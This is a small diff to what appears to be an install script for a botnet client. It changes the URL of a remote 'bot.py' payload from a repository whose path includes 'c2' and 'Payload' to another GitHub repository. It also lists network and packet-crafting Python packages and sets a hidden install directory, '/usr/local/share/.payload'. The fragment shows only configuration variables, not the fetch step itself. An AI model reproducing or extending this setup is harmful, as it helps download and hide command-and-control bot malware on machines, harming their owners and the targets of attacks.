@@ -1,5 +1,5 @@
 PYTHON_PACKAGES="cloudscraper requests pysocks scapy icmplib"
-PAYLOAD_URL="https://raw.githubusercontent.com/0bxb2/c23/refs/heads/main/c2/src/Payload/bot.py"
+PAYLOAD_URL="https://raw.githubusercontent.com/Peppe12367/-2272---2-72-/refs/heads/main/bot.py"
 
 PAYLOAD_DIR="/usr/local/share/.payload"
 PAYLOAD_PATH="${PAYLOAD_DIR}/bot.py"
